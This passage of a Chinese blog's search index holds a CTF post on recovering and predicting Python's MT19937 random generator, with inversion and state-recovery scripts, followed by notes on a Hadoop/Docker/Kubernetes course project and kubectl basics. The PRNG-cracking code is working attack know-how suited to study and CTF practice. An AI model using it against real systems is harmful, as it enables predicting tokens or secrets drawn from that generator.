((x\\ll7)\\\u00262636928640)\\\\ \\quad\\quad\\quad\\quad\\quad\\quad =x \\oplus ((x\\ll7)\\\u002610011101001011000101011010000000) $$注意后七位都是0，那么最后结果的后七位和最初状态的后七位就是相同的，在y已知的情况下，我们就可以步步回推了，比如倒数8~14位就是 $$ (后七位 \\\u0026 0101101) \\oplus y的倒数8到14位 $$其他的类似，用代码实现如下 def invert(res, shift, right=True, mask=0xffffffff, bits=32): tmp = res if right: for i in range(bits // shift): tmp = res ^ tmp \u003e\u003e shift \u0026 mask return tmp else: for i in range(bits // shift): tmp = res ^ tmp \u003c\u003c shift \u0026 mask return tmp def inv_extract_number(y): y = invert(y,18,True) y = invert(y,15,False,4022730752) y = invert(y,7,False,2636928640) y = invert(y,11,True) return _int32(y) ","date":"2025-06-28","objectID":"/mt19937/:2:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"逆向twist 在上文中我们提到如果得到了某一轮 state 的全部信息便可以向后预测随机数，那么如果我们需要向前恢复随机数，则需要对 twist 函数进行逆向。 def twist(self): for i in range(0, 624): y = _int32((self.mt[i] \u0026 0x80000000) + (self.mt[(i + 1) % 624] \u0026 0x7fffffff)) self.mt[i] = (y \u003e\u003e 1) ^ self.mt[(i + 397) % 624] if y % 2 != 0: self.mt[i] = self.mt[i] ^ 0x9908b0df 先关注旋转的后几步操作，能注意到由于 y\u003e\u003e1的最高位一定为 0，所以最终 self.mt[i]的最高位一定由 self.mt[(i + 397) % 624]或 self.mt[(i + 397) % 624] ^ 0x9908b0df控制，所以可以判断出是否经历了xor 0x9908b0df 操作。然后由于是否异或操作同时受最低位控制，那么逆向的时候即可，通过是否异或来恢复因为就右移而丢失的最低位。于是我们就得到了 y 然后分析旋转的第一步，y 是由 self.mt[i]的最高位和 self.mt[(i + 1) % 624]的除最高位部分组合得到的。所以我们只要计算 self.mt[i]和 self.mt[(i - 1) % 624]两个位置的 y 就能得到 self.mt[i]的值了 def inv_twist(state): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df def _recover(i): y = state[i] ^ state[(i + 397) % 624] if y \u0026 high == high: y ^= mask y \u003c\u003c= 1 y |= 1 else: y \u003c\u003c= 1 return y for i in range(len(state)-625, -1, -1): state[i] = _recover(i) \u0026 high state[i] |= _recover(i-1) \u0026 low return state ","date":"2025-06-28","objectID":"/mt19937/:3:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"逆向init 这玩意的主要操作是 self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] » 30) + i) 你可以发现，里面主要是乘法加法和self.mt[i - 1] ^ self.mt[i - 1] \u003e\u003e 30，前两者可逆运算，后面这个和前面的类似，通过invert逐位还原即可 def inv_init(last): n = 1\u003c\u003c32 inv = pow(1812433253,-1,n) for i in range(623,0,-1): last = ((last-i)*inv)%n last = invert(last,30) return last ","date":"2025-06-28","objectID":"/mt19937/:4:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"给出任意19937个bit 这个类型是看鸡块神的博客学到的，主要的地方还是在于构建矩阵，直接上脚本吧 Dall=list(map(int,open('data3.txt','r').readlines())) from Crypto.Util.number import * from random import * from tqdm import * n=1250 D=Dall[:n] rng=Random() def getRows(rng): #这一部分根据题目实际编写，必须和题目实际比特获取顺序和方式完全一致，且确保比特数大于19937，并且请注意zfill。 row=[] for i in range(n): row+=list(map(int, (bin(rng.getrandbits(16))[2:].zfill(16)))) return row M=[] for i in tqdm_notebook(range(19968)):#这一部分为固定套路，具体原因已经写在注释中了 state = [0]*624 temp = \"0\"*i + \"1\"*1 + \"0\"*(19968-1-i) for j in range(624): state[j] = int(temp[32*j:32*j+32],2) rng.setstate((3,tuple(state+[624]),None)) #这个setstate也是固定格式，已于2025.1.21测试 M.append(getRows(rng)) M=Matrix(GF(2),M) y=[] for i in range(n): y+=list(map(int, (bin(D[i])[2:].zfill(16)))) y=vector(GF(2),y) s=M.solve_left(y) #print(s) G=[] for i in range(624): C=0 for j in range(32): C\u003c\u003c=1 C|=int(s[32*i+j]) G.append(C) import random RNG1 = random.Random() for i in range(624): G[i]=int(G[i]) RNG1.setstate((int(3),tuple(G+[int(624)]),None)) print([RNG1.getrandbits(16) for _ in range(75)]) print(D[:75]) ","date":"2025-06-28","objectID":"/mt19937/:5:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"常用脚本 ","date":"2025-06-28","objectID":"/mt19937/:6:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"原始版本 最经典的款式，速度慢，不好用 def construct_a_row(RNG): row = [] for _ in range(19968//32): tmp = RNG.getrandbits(32) row += list(map(int, bin(tmp)[2:].zfill(32))) return row # 构造线性方程组的矩阵 L = [] for i in trange(19968): state = [0]*624 # MT19937使用624个32位整数作为状态 # 构造一个只有一位为1,其他都为0的序列 temp = \"0\"*i + \"1\"*1 + \"0\"*(19968-1-i) # 将这个序列分成624段,每段32位,转换为整数 for j in range(624): state[j] = int(temp[32*j:32*j+32], 2) RNG = Random() RNG.setstate((3,tuple(state+[624]),None)) L.append(construct_a_row(RNG)) # 将L转换为GF(2)上的矩阵（二进制域） L = Matrix(GF(2),L) print(L.nrows(), L.ncols()) def MT19937_re(state): try: # 构造目标向量R R = [] for i in state: R += list(map(int, bin(i)[2:].zfill(32))) R = vector(GF(2), R) s = L.solve_left(R) # 这里可能会抛出异常 # 将解转换为二进制字符串 init = \"\".join(list(map(str,s))) state = [] # 将解重新分割成624个32位整数 for i in range(624): state.append(int(init[32*i:32*i+32],2)) # 创建新的RNG并设置恢复出的状态 RNG1 = Random() RNG1.setstate((3,tuple(state+[624]),None)) return RNG1 except Exception as e: print(f\"[-]{e}\") pass RNG = MT19937_re() ","date":"2025-06-28","objectID":"/mt19937/:6:1","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"randcrack 一个无脑的方法？直接利用这个库进行预测，但是只能是624*32，要不然不行 import random from randcrack import RandCrack rc = RandCrack() for i in range(624): rc.submit(random.getrandbits(32)) print(random.getrandbits(64)) print(rc.predict_getrandbits(64)) github上有一个优化后的版本，但是还没有用过，可以看看链接 ","date":"2025-06-28","objectID":"/mt19937/:6:2","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"gf2bv maple神写的一个库，本质是接GF(2)方程组的，MT19937刚刚好满足，所以可以拿来使用，传送门。TGCTF的那个题就可以用这个库去写，非常的好用。 示例代码 from gf2bv import LinearSystem from gf2bv.crypto.mt import MT19937 from tqdm import * import random from Crypto.Util.number import * def mt19937(bs, out): lin = LinearSystem([32] * 624) mt = lin.gens() rng = MT19937(mt) #rng.getrandbits(175) zeros = [rng.getrandbits(bs) ^ o for o in out] + [mt[0] ^ 0x80000000] print(\"solving...\") sol = lin.solve_one(zeros) rng = MT19937(sol) pyrand = rng.to_python_random() for i in range(2496): out.append(pyrand.getrandbits(8)) print(pyrand.getrandbits(8)) import random random.seed(1) out=[] for i in range(2496): out.append(random.getrandbits(8)) mt19937(8, out) 这里，zeros.append()的时候需要注意和题目中获取randbits的方式一致。生成的pyrand其实是它的初始状态，需要预测哪个就往后递推就行了。 关于安装： mac直接去github下m4ri的包，然后本地编译后sudo make install 如果像我一样在pyenv这种虚拟环境里面跑python的，把环境注入进去 export CFLAGS=\"-I/usr/local/include\" export LDFLAGS=\"-L/usr/local/lib\"然后再pip install . ","date":"2025-06-28","objectID":"/mt19937/:6:3","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["容器"],"content":"云计算课设 这个课设是一个基于MapReduce的倒排索引系统，核心是Hadoop+docker+k8s ","date":"2025-06-11","objectID":"/yjsks/:1:0","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"整体架构 前端 vue+nodejs 后端 nodejs+express+redis+sqlite3 部署方法 dockerfile+k8s 数据处理方法 Hadoop ","date":"2025-06-11","objectID":"/yjsks/:1:1","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"课设灵感 自己blog的搜索功能很弱，采用的是js插件的全局遍历搜索，就在网上查了一下优化方法，顺便知道了倒排索引这种方法，结合云计算课堂的docker和Hadoop知识，便有了这个课设 ","date":"2025-06-11","objectID":"/yjsks/:1:2","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"倒排索引介绍 什么是正排索引 可以简单的理解为通过文档找词 文档--\u003e 单词1 ,单词2 单词1 出现的次数 单词出现的位置； 单词2 单词2出现的位置 ... 正排索引的优势在于可以快速的查找某个文档里包含哪些词项。同理，正排不适用于查找包含某个词项的文档有哪些。 什么是倒排索引 倒排索引（Inverted Index）是一种常用的文本索引数据结构，用于加快文本搜索和信息检索的速度。它是一种反转（Inverted）的索引结构，将文档中的每个单词映射到包含该单词的文档列表。 通常，倒排索引由两个主要组成部分构成：词项表（Term Dictionary）和倒排列表（Inverted List）。 词项表（Term Dictionary）：词项表是一个词项到倒排列表的映射，它记录了所有不重复的单词（或词项）以及它们对应的倒排列表的位置信息。 倒排列表（Inverted List）：倒排列表包含了一个单词在文档集合中的出现位置。对于每个单词，倒排列表记录了包含该单词的文档的标识符（例如文档ID）以及该单词在文档中的位置信息（例如单词出现的位置或出现的频率）。 用一个图直观展示两者的区别 ","date":"2025-06-11","objectID":"/yjsks/:1:3","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"前端设计 文件结构 │ .dockerignore │ Dockerfile │ index.html │ package-lock.json │ package.json │ results.html │ server.js │ vite.config.js │ ├─public │ favicon-16x16.png │ icon_search.svg │ leetcode.png │ title.ttf │ └─src └─assets base.css main.css 文件介绍 .html文件就是用户搜索/显示题目的页面 public存的图片 src存的样式(ai完成的，自己真的不会写) dokcerfile和.dockerignore生成docker用 server.js本地启动项目并且用于后续k8s部署时同步环境 package.json用来配置项目依赖，package-lock.json自动生成 交互设计 前后端通过POST互通，经过解析后显示 ","date":"2025-06-11","objectID":"/yjsks/:1:4","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"后端设计 文件结构 ├── data/ #数据存放 ├── src/ │ ├── config/ # 配置文件 │ ├── controllers/ # 控制器 │ ├── models/ # 数据模型 │ ├── routes/ # 路由 │ ├── services/ # 业务逻辑 │ └── utils/ # 工具函数 ├── Dockerfile # Docker 配置 ├── package.json # 项目配置 └── README.md # 项目说明 数据获取 拿的力扣的数据，他们的api用的graphql，本来想用牛客的，结果76跟我说牛客没有这种接口，期末时间紧，也懒得爬了xd 拉数据非常简单，比如 https://leetcode.com/graphql?query=query { userContestRanking(username: \"YOUR_USERNAME\") { attendedContestsCount rating globalRanking totalParticipants topPercentage } userContestRankingHistory(username: \"YOUR_USERNAME\") { attended trendDirection problemsSolved totalProblems finishTimeInSeconds rating ranking contest { title startTime } } } 在浏览器里面搜这个，就可以得到一堆数据了 存到数据里面并把url删除，存于data/input.txt里面，类似1 Two Sum Easy array hash-table，准备进行mapreduce的分词 Hadoop处理 首先把数据ftp传上去，然后在hdfs里面搞个文件夹，并且数据扔进去 hdfs dfs -mkdir /input hdfs dfs -put ~/input.txt /input/ 使用mapreduce进行分词 根据Hadoop streaming 的规则，只要我们使用标准的输入输出，什么语言都行，直接nodejs启动了，mapper.js起到这个作用。 在map阶段，我们按行读取内容，并将处理后的内容分为docId 和单词，并使用标准输入输出进行输出方便后续reduce处理，所以就有了reduce.js。 生成并且拉出数据 hadoop jar $HADOOP_HOME/share/hadoop/tools/lib/hadoop-streaming-3.3.6.jar -D mapreduce.job.maps=4 -D mapreduce.job.reduces=4 -files mapper.js,reducer.js -mapper “node mapper.js” -reducer “node reducer.js” -input /input/input.txt -output /output hdfs dfs -get /output ~/hadoop_output 存入redis 具体来说，我们读取处理好的单词与文章的映射，并根据单词在某个文章中出现的次数对其进行排序，如 ZSM (46,1),(589,1),(32,1),(42,2),(22,1) 变成ZSM (42,2),(46,1),(589,1),(32,1),(22,1) ","date":"2025-06-11","objectID":"/yjsks/:1:5","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"docker部署 前端 # 使用基础的 Node.js 镜像作为基础 FROM node:18 # 设置工作目录 WORKDIR /usr/src/app # 将 package.json 和 package-lock.json 复制到工作目录 COPY package*.json ./ # 安装依赖 RUN npm install # 复制项目文件到工作目录 COPY . . # 暴露容器的端口（根据你的项目配置） EXPOSE 5173 # 运行前端应用 CMD [\"node\", \"server.js\"] 全部文件拉进去，运行进行了，一定要在里面去npm install，要不然会有环境问题，比如arm和x86的包不兼容 后端 这里我把sqlite3也包进去了，反正比较轻量 FROM node:18-alpine # 安装构建 better-sqlite3 所需的依赖 RUN apk add --no-cache python3 make g++ sqlite-dev WORKDIR /app COPY package*.json ./ RUN npm install COPY . . EXPOSE 9999 CMD [\"npm\", \"start\"] ","date":"2025-06-11","objectID":"/yjsks/:1:6","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"k8s部署 redis部署 首先要理解，每个pod都是和主机环境直接隔离的，如果我想用主机docker上面部署的redis是可以的，但是需要的url就是http://ip:port，是固定的，那你换个网本地调试是不是炸了，所以拿一个port部署redis是很有必要的 apiVersion: apps/v1 kind: Deployment metadata: name: redis spec: replicas: 1 selector: matchLabels: app: redis template: metadata: labels: app: redis spec: containers: - name: redis image: redis:7.2 ports: - containerPort: 6379 --- apiVersion: v1 kind: Service metadata: name: redis-service spec: selector: app: redis ports: - protocol: TCP port: 6379 targetPort: 6379 前端部署 这里我采用docker+k8s，可以看k8s的那个文章，讲了一点点原理，所以本地docker搭建的时候是docker build -t yunjisuanfront:latest . apiVersion: apps/v1 kind: Deployment metadata: name: yunjisuan-frontend spec: replicas: 1 selector: matchLabels: app: yunjisuan-frontend template: metadata: labels: app: yunjisuan-frontend spec: containers: - name: yunjisuan-frontend image: yunjisuanfront:latest imagePullPolicy: Never # 使用本地镜像 ports: - containerPort: 5173 # 根据你的前端实际端口调整 env: - name: BACKEND_URL value: \"http://yunjisuan-backend-service:9999\" --- apiVersion: v1 kind: Service metadata: name: yunjisuan-frontend-service spec: selector: app: yunjisuan-frontend ports: - port: 5173 targetPort: 5173 type: LoadBalancer # 负载均衡 后端部署 apiVersion: apps/v1 kind: Deployment metadata: name: yunjisuan-backend spec: replicas: 1 selector: matchLabels: app: yunjisuan-backend template: metadata: labels: app: yunjisuan-backend spec: containers: - name: yunjisuan-backend image: yunjisuan-backend:latest imagePullPolicy: Never # 使用本地镜像 ports: - containerPort: 9999 env: - name: DB_PATH value: \"/app/data/questions.db\" - name: REDIS_HOST value: \"redis-service\" - name: REDIS_PORT value: \"6379\" - name: NODE_ENV value: \"production\" volumeMounts: - name: data-volume mountPath: /app/data volumes: - name: data-volume persistentVolumeClaim: claimName: yunjisuan-data-pvc --- apiVersion: v1 kind: Service metadata: name: yunjisuan-backend-service spec: selector: app: yunjisuan-backend ports: - port: 9999 targetPort: 9999 type: ClusterIP 注意要去吃到数据库和redis的路径/端口，然后再挂个持久化 apiVersion: v1 kind: PersistentVolumeClaim metadata: name: yunjisuan-data-pvc spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi 关于自动化 以上方法虽然用的是last版本，但是有bug的话你就要删掉重建，很麻烦，如何自动推送启用last版本的docker镜像呢？？？ 方法一 利用自动化sh脚本 #!/bin/bash PREVIOUS_DIGEST=\"\" while true; do DIGEST=$(docker image inspect yunjisuanfront:latest --format='{{index .Id}}') if [[ \"$DIGEST\" != \"$PREVIOUS_DIGEST\" ]]; then echo \"镜像已更新，重启 Deployment...\" kubectl rollout restart deployment yunjisuan-frontend PREVIOUS_DIGEST=\"$DIGEST\" fi sleep 10 done 方法二 使用本地 registry + 镜像 tag 唯一化 每次你 build 镜像时，给它一个唯一 tag（比如使用时间戳、Git 提交哈希），然后更新 Deployment 镜像地址。这样 Kubernetes 会认为镜像变了，从而重建 Pod。 本地搭建 Docker Registry docker run -d -p 5000:5000 –name registry –restart=always registry:2 构建并推送带唯一 tag 的镜像 TIMESTAMP=$(date +%s) docker build -t localhost:5000/yunjisuanfront:$TIMESTAMP . docker push localhost:5000/yunjisuanfront:$TIMESTAMP 更新 Deployment 的镜像地址 image: localhost:5000/yunjisuanfront:{{TIMESTAMP}} imagePullPolicy: Always 可以使用脚本/CI 工具（如 GitHub Actions）自动完成 build → push → update YAML → apply。 比如 #!/bin/bash set -e # 1. 生成唯一 tag TAG=$(date +%s) # 2. 构建镜像 docker build -t localhost:5000/yunjisuanfront:$TAG . # 3. 推送到本地 registry docker push localhost:5000/yunjisuanfront:$TAG # 4. 渲染模板 envsubst \u003c deploy/frontend.yaml.template \u003e deploy/frontend.yaml # 5. 应用到 K8s kubectl apply -f deploy/frontend.yaml echo \"✅ 镜像 yunjisuanfront:$TAG 已部署到 Kubernetes\" ","date":"2025-06-11","objectID":"/yjsks/:1:7","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"鸽子时间 如果有时间，可能会研究持久化抓取数据-\u003eHadoop自动化处理-\u003e推送数据库-\u003e重建镜像-\u003epod重启，但是比较复杂，而且吃性能，后面再说吧。 咕咕咕 ","date":"2025-06-11","objectID":"/yjsks/:1:8","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"本地小bug(6.12更新) 在本地部署成功之后，需要把后端port转发到本地，原因是，Pod 和 Service 默认是内网通信的，如果前端vue要访问后端api，我必须要走本地这里 kubectl port-forward service/yunjisuan-backend-service 9999:9999 \u0026 ","date":"2025-06-11","objectID":"/yjsks/:1:9","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"云上问题(6.13更新) dokcer 此docker指的是k8s部署的时候用的docker，本地没有这个问题，可能是orb的功劳？ 在docker build -t frontend:latest .后，你拥有了本地镜像，这个时候你也许会运行kubectl apply -f **.yaml，然后kubectl get pod，然后就发现会镜像错误，原因是k8s和docker用的虽然都是containerd，但是不能直接利用！ 你需要 docker save frontend:latest -o frontend.tar docker load -i frontend.tar ctr -n k8s.io images import frontend.tar //推送到containerd 这样才可以使用本地的 部署问题 部署其实在网上有很多教程，为什么我还是配置了一晚上呢？ 第一开始并没有详细的看教程，直接apt启动加上个人想象力了，发现环境炸了的时候已经救不回来了，所以后面带着docker整个卸载重装了 最后选择了k3s，更加轻量化，也更好配置(2c2g的服务器搞这种东西真有点难)。 但是问题依旧很多，比如k3s的镜像问题，DNS转发都转发不了的，我选择了全部pull到本地，然后打包成tar传上去，虽然很慢，但是很稳。 为什么不换源呢？我是真的没有找到可以用的，不知道为什么，我可以用的docker源拉到k3s里面都烂了，下次可以试试搞个镜像站吧。 ","date":"2025-06-11","objectID":"/yjsks/:1:10","tags":["开发"],"title":"云计算课设","uri":"/yjsks/"},{"categories":["容器"],"content":"关于安装 mac的话可以直接orb一把梭了，里面直接启动即可，如果不想的话，就直接去看官方安装方法我感觉不如orb，linux和win只能安装官方的来咯 ","date":"2025-06-09","objectID":"/study-k8s/:1:0","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"常用命令 ","date":"2025-06-09","objectID":"/study-k8s/:2:0","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"基础信息查看命令 命令 作用 kubectl version 查看客户端与服务端版本信息 kubectl cluster-info 查看集群的基本信息（API Server、Dashboard 等） kubectl get nodes 查看集群中的节点 kubectl describe node \u003c节点名\u003e 查看某个节点的详细信息 kubectl get all 查看当前命名空间下所有资源 ","date":"2025-06-09","objectID":"/study-k8s/:2:1","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Pod 相关操作 命令 作用 kubectl get pods 查看所有 Pod kubectl get pods -o wide 查看 Pod 的详细信息（包含 IP、节点） kubectl describe pod \u003cpod名\u003e 查看某个 Pod 的详细信息 kubectl logs \u003cpod名\u003e 查看 Pod 的日志输出 kubectl exec -it \u003cpod名\u003e -- /bin/bash 进入容器内部（需要容器中有 bash） kubectl delete pod \u003cpod名\u003e 删除指定 Pod ","date":"2025-06-09","objectID":"/study-k8s/:2:2","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Deployment、Service 等资源操作 命令 作用 kubectl get deployment 查看 Deployment kubectl describe deployment \u003c名字\u003e 查看 Deployment 详细信息 kubectl apply -f \u003cyaml文件\u003e 应用 YAML 文件，创建/更新资源 kubectl delete -f \u003cyaml文件\u003e 删除 YAML 文件定义的资源 kubectl scale deployment \u003c名字\u003e --replicas=\u003c数量\u003e 扩缩容 Deployment 的副本数 kubectl rollout restart deployment \u003c名字\u003e 重启 Deployment（会滚动更新 Pod） kubectl rollout status deployment \u003c名字\u003e 查看 Deployment 的滚动更新状态 kubectl expose deployment \u003c名字\u003e --type=NodePort --port=80 暴露 Deployment 为服务 ","date":"2025-06-09","objectID":"/study-k8s/:2:3","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"命名空间 Namespace 管理 命令 作用 kubectl get namespaces 查看所有命名空间 kubectl create namespace \u003c名称\u003e 创建新的命名空间 kubectl delete namespace \u003c名称\u003e 删除命名空间 kubectl get pods -n \u003cnamespace\u003e 查看指定命名空间下的 Pod kubectl config set-context --current --namespace=\u003c名称\u003e 设置默认命名空间 ","date":"2025-06-09","objectID":"/study-k8s/:2:4","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"配置管理（ConfigMap \u0026 Secret） 命令 作用 kubectl create configmap \u003c名称\u003e --from-literal=key=value 创建 ConfigMap（从字面值） kubectl create configmap \u003c名称\u003e --from-file=\u003c文件路径\u003e 创建 ConfigMap（从文件） kubectl get configmap 查看 ConfigMap kubectl describe configmap \u003c名称\u003e 查看 ConfigMap 详情 kubectl create secret generic \u003c名称\u003e --from-literal=key=value 创建 Secret kubectl get secret 查看 Secret kubectl describe secret \u003c名称\u003e 查看 Secret 详情（数据为 base64 编码） ","date":"2025-06-09","objectID":"/study-k8s/:2:5","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"资源清理与调试 命令 作用 kubectl delete pod --all 删除当前命名空间下的所有 Pod kubectl get events 查看事件日志，排查问题 kubectl top pod 查看 Pod 的 CPU 和内存使用情况（需要安装 Metrics Server） kubectl cp \u003cpod名\u003e:\u003c容器路径\u003e \u003c本地路径\u003e 从容器中拷贝文件到本地 kubectl debug \u003cpod名\u003e 使用临时容器调试（1.18+ 版本支持） ","date":"2025-06-09","objectID":"/study-k8s/:2:6","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"进阶命令和补充 命令 作用 kubectl edit \u003c资源类型\u003e \u003c名称\u003e 使用编辑器修改资源定义 kubectl explain \u003c资源\u003e 查看资源字段的文档说明 kubectl api-resources 查看集群支持的 API 资源类型 kubectl get \u003c资源\u003e -A 查看所有命名空间的资源（如 -A 表示 all namespaces） ","date":"2025-06-09","objectID":"/study-k8s/:2:7","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Pod\u0026Deployment\u0026Service ","date":"2025-06-09","objectID":"/study-k8s/:3:0","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Pod 是Kubernetes中最小的可调度单元，表示运行中的的一个or多个容器，比如 kubectl get pods NAME READY STATUS RESTARTS AGE redis-c479dfb5-wcj8g 1/1 Running 0 45h yunjisuan-backend-5fbbd85dd8-kkqq7 1/1 Running 0 43h yunjisuan-frontend-56fd559cbd-gjf2b 1/1 Running 0 43h 我的视角里把他当作一个容器的载体，一般是一对一的关系，而且当这个pod挂掉了，他是不会自动重建的，需要用Deployment去启动，这也是为什么官方不会让你直接创建pod的原因？ ","date":"2025-06-09","objectID":"/study-k8s/:3:1","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Deployment 是一种控制器，用于管理 Pod 的副本、副本数量、升级、回滚等，比如 kubectl get deployments NAME READY UP-TO-DATE AVAILABLE AGE redis 1/1 1 1 45h yunjisuan-backend 1/1 1 1 43h yunjisuan-frontend 1/1 1 1 43h 在我视角里他是pod的管理者，并且可以自动重新创建运行失败的pod，具备高可用和可扩展性。Deployment 就像是 Pod 的调度与生命周期控制器 ","date":"2025-06-09","objectID":"/study-k8s/:3:2","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Pod与Deployment的关系 可能会注意到 kubectl get deployments kubectl get pods 这两条指令的输出内容是差不多的，为什么呢？ 看一个层级结构图吧 Deployment └── ReplicaSet（自动管理） └── Pod（实际运行） Deployment 是“宣言式配置”：你说我需要 1 个 nginx 服务，它就帮你创建和维持它。 ReplicaSet 是由 Deployment 自动创建的副本控制器，不需要你关心。 Pod 是最终由 ReplicaSet 实际运行的容器单元。 那我目前在一个Deployment下只创建了一个pod，kubectl get deployments显示的是部署情况，kubectl get pods显示的是真实运行的容器实例，所以相似是合理的，并且可以发现，pod在创建时会自动加上一个随机字符串的后缀 ","date":"2025-06-09","objectID":"/study-k8s/:3:3","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Service Pod 是会消失和变化的（比如被重新调度、重启等），而它们的 IP 地址也是 不固定的。 所以为了让外部访问、或内部服务间通信能找到 Pod、负载均衡、自动发现，就需要一个“中间层”来负责这个事，那就是：service 为什么需要 Service？ 问题 Service 怎么解决 Pod 的 IP 不稳定？ Service 提供一个固定 IP 和 DNS 名字 有多个 Pod（副本）？ Service 自动做负载均衡 不同命名空间、服务间需要通信？ Service 让通信变得可控和可配置 想暴露服务到集群外部？ Service 可以暴露端口给外部访问 Service 的类型 类型 说明 用途 ClusterIP（默认） 只在集群内部可访问 后端服务通信（比如：前端调后端） NodePort 绑定每个 Node 的某个端口，对外暴露 外部访问集群中服务 LoadBalancer 由云服务商分配一个负载均衡器 IP 生产环境常用，适合云平台 ExternalName 映射到外部 DNS 名称 访问外部服务（如数据库） 一般部署是通过编辑文件实现效果 假设有个 Deployment apiVersion: apps/v1 kind: Deployment metadata: name: my-backend spec: replicas: 3 selector: matchLabels: app: my-backend template: metadata: labels: app: my-backend spec: containers: - name: app image: my-backend:latest ports: - containerPort: 8080 我们为它创建一个 Service去ClusterIP： apiVersion: v1 kind: Service metadata: name: my-backend-service spec: type: ClusterIP selector: app: my-backend ports: - port: 80 # Service 暴露的端口 targetPort: 8080 # 容器实际监听的端口 其他的pod就可以通过http://my-backend-service:80访问 ","date":"2025-06-09","objectID":"/study-k8s/:3:4","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Service \u0026 Pod 的关联 Kubernetes 中的 Pod 会带有 labels（标签），而 Service 会通过 selector（选择器）来选中这些 Pod，两者通过这个机制产生关联，比如pod的定义如下 apiVersion: v1 kind: Pod metadata: name: my-backend-pod labels: app: my-backend tier: backend spec: containers: - name: backend image: my-backend:latest ports: - containerPort: 8080 你就可以看见labels的内容是app和tier，然后我们定义一个 Service apiVersion: v1 kind: Service metadata: name: my-backend-service spec: selector: app: my-backend ports: - port: 80 targetPort: 8080 在selector里面指向这个app，这个server就会找到所有含这个标签的pod，并且添加到Endpoints(负载池)里面。 示意图 [ Service ] | └── selector: app=xxx ↓（匹配标签） ┌───────────────┐ │ Pod 1 │ ← labels: app=xxx ├───────────────┤ │ Pod 2 │ ← labels: app=xxx └───────────────┘ Service 自动负载均衡访问这两个 Pod！ ","date":"2025-06-09","objectID":"/study-k8s/:3:5","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Namespace Namespace 是 Kubernetes 的逻辑隔离机制，可以把同一个集群划分成多个“虚拟子集群”。就像是在一个东西里面又分了好几块，互不影响，各自管理。 ","date":"2025-06-09","objectID":"/study-k8s/:4:0","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Namespace 和哪些东西有关系 资源对象的作用域 属于 Namespace 的资源 示例 Pod / Deployment / StatefulSet / Job 运行的工作负载 Service / Ingress 服务暴露方式 ConfigMap / Secret 配置和敏感数据 PVC（PersistentVolumeClaim） 存储请求 ServiceAccount / Role / RoleBinding 权限控制 访问权限控制 比如 kind: Role metadata: namespace: dev rules: - apiGroups: [\"\"] resources: [\"pods\"] verbs: [\"get\", \"list\", \"create\"] 配合 RoleBinding(绑定用户用的)，就可以让某个用户只能操作 dev 命名空间里的 Pod 资源配额限制 Kubernetes 支持对每个命名空间限制 CPU、内存、Pod 数量等资源，防止“某一方霸占资源”。 apiVersion: v1 kind: ResourceQuota metadata: name: mem-cpu-limit namespace: dev spec: hard: requests.cpu: \"2\" requests.memory: 4Gi limits.cpu: \"4\" limits.memory: 8Gi 这样去设置上限 名字隔离 同一个名字在不同的命名空间内是可以重复的 kubectl get pods -n dev kubectl get pods -n prod DNS 服务发现 同名服务在不同命名空间中是不会冲突的 比如http://my-service.default.svc.cluster.local的完整格式是\u003cservice-name\u003e.\u003cnamespace\u003e.svc.cluster.local ","date":"2025-06-09","objectID":"/study-k8s/:4:1","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"ConfigMap \u0026 Secret 名称 作用 内容类型 存储方式 ConfigMap 存储非敏感配置（如环境变量、配置文件） 普通明文 Base64 编码但不加密 Secret 存储敏感信息（如密码、Token、证书） 加密/编码内容 默认 